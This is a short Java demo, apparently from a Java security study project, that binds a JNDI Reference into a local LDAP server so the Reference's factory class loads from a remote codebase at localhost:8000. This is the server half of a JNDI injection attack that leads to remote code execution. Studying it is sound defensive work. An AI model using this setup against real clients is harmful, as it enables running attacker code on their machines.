package com.pacemrc.javasec.jndi;

import javax.naming.InitialContext;
import javax.naming.Reference;
/**
 * 使用需要先开启LDAP服务
 */
public class JNDILDAPServer {
    public static void main(String[] args) throws Exception {

        InitialContext initialContext = new InitialContext();
        Reference refObj = new Reference("org.demo.TestRef", "org.demo.TestRef", "http://localhost:8000/");
        initialContext.rebind("ldap://127.0.0.1:10389/cn=test,dc=example,dc=com", refObj);
    }
}
